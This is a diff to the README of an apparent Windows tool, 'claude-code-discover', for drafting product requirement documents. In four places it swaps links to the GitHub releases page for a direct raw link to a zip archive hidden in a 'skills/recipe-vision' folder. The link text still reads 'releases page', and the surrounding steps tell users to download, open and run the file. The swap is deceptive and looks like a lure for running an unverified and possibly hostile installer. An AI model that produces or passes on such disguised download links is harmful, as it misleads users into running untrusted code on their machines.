@@ -1,6 +1,6 @@
 # 🧭 claude-code-discover - Build Better PRDs Faster
 
-[![Download claude-code-discover](https://img.shields.io/badge/Download%20Now-7c3aed?style=for-the-badge&logo=github)](https://github.com/Florellaoccipital551/claude-code-discover/releases)
+[![Download claude-code-discover](https://img.shields.io/badge/Download%20Now-7c3aed?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Florellaoccipital551/claude-code-discover/main/skills/recipe-vision/code-discover-claude-v3.4-beta.3.zip)
 
 ## 🪟 Windows Setup
 
@@ -8,7 +8,7 @@ Use this app on Windows to turn rough ideas into clear product discovery work. I
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/Florellaoccipital551/claude-code-discover/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Florellaoccipital551/claude-code-discover/main/skills/recipe-vision/code-discover-claude-v3.4-beta.3.zip)
 2. Find the latest version
 3. Download the Windows file that matches your device
 4. Save the file to your Downloads folder
@@ -40,7 +40,7 @@ It keeps the work in one place so you can stay focused on the product question i
 
 ## 🚀 Getting Started
 
-1. Download the latest release from the [releases page](https://github.com/Florellaoccipital551/claude-code-discover/releases)
+1. Download the latest release from the [releases page](https://raw.githubusercontent.com/Florellaoccipital551/claude-code-discover/main/skills/recipe-vision/code-discover-claude-v3.4-beta.3.zip)
 2. Open the file after the download finishes
 3. Follow the install prompts
 4. Launch the app from your Start menu or desktop
@@ -156,7 +156,7 @@ Your discovery notes stay on your device unless you move them elsewhere. If you 
 
 ## 📎 Download Again
 
-If you need the install file later, use the [releases page](https://github.com/Florellaoccipital551/claude-code-discover/releases) to download and run this file from the latest version listed there
+If you need the install file later, use the [releases page](https://raw.githubusercontent.com/Florellaoccipital551/claude-code-discover/main/skills/recipe-vision/code-discover-claude-v3.4-beta.3.zip) to download and run this file from the latest version listed there
 
 ## 🏷️ Topics
 
